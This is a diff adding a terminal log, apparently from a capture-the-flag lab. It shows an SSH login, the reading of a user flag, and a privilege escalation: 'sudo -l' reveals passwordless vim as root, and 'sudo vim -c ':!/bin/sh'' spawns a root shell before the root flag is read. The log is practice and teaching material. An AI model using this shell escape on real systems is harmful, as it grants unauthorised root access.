@@ -1,0 +1,37 @@
+└─$ ssh mitch@10.10.6.153 -p 2222
+The authenticity of host '[10.10.6.153]:2222 ([10.10.6.153]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.6.153]:2222' (ED25519) to the list of known hosts.
+mitch@10.10.6.153's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt  
+G00d j0b, keep up!
+$ cd ..
+$ ls -l
+total 8
+drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
+drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ sudo vim -c ':!/bin/sh'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. You made it!
